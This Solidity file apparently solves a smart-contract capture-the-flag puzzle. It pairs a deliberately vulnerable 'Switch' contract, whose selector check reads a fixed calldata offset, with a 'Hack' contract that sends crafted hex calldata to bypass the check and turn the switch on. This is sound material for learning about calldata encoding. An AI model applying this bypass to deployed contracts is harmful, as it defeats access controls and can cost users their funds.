// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Difference between bytes and bytes32

contract Hack {

    Switch private target;

    constructor(address _target) {
        target = Switch(_target);
    }

    function generateData() external pure returns (bytes32){
        return keccak256("turnSwitchOff()");
    }

    function generateData1() external pure returns (bytes32){
        return keccak256(abi.encodePacked("turnSwitchOff()"));
    }

    function generateData2(string memory _text, string memory _anotherText) external pure returns (bytes32){
        return  keccak256(abi.encodePacked(_text, _anotherText));
    }

    function generateData3() external pure returns (bytes32){
         return keccak256(abi.encode("turnSwitchOff()"));
    }

    function generateData4() external pure returns (bytes32){
        return bytes32(abi.encodeWithSignature("turnSwitchOff()", "turnSwitchOn()"));
    }

    function attack() external{
        
        bytes memory callData =
        hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        (bool ok, ) = address(target).call(callData);
        require(ok, "not ok");
    }


}

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

     modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(
            selector[0] == offSelector,
            "Can only call the turnOffSwitch function"
        );
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }

}